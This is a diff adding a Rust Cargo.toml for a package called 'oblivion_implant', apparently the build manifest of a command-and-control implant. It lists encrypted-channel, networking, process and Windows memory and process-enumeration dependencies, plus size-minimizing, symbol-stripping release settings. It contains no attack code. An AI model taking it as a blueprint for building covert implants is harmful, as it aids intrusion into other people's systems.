@@ -1,0 +1,40 @@
+[package]
+name = "oblivion_implant"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+# Async runtime (compact for implant)
+tokio = { version = "1.35", features = ["rt", "net", "time", "process", "fs", "io-util"], default-features = false }
+
+# Cryptography
+snow = { version = "0.9", default-features = false, features = ["default-resolver"] }
+rand = { version = "0.8", default-features = false }
+sha2 = { version = "0.10", default-features = false }
+
+# Serialization
+prost = { version = "0.12", default-features = false, features = ["prost-derive"] }
+bytes = { version = "1.5", default-features = false }
+
+# Encoding
+base64 = { version = "0.21", default-features = false }
+
+# System info
+sysinfo = { version = "0.30", default-features = false, features = ["system"] }
+
+# Windows-specific
+[target.'cfg(windows)'.dependencies]
+windows = { version = "0.52", features = [
+    "Win32_System_Threading",
+    "Win32_System_ProcessStatus",
+    "Win32_Security",
+    "Win32_System_Memory",
+    "Win32_System_Diagnostics_ToolHelp",
+] }
+
+[profile.release]
+opt-level = "z"      # Optimize for size
+lto = true           # Link-time optimization
+panic = "abort"      # No unwinding
+strip = true         # Strip symbols
+codegen-units = 1    # Single codegen unit for better optimization
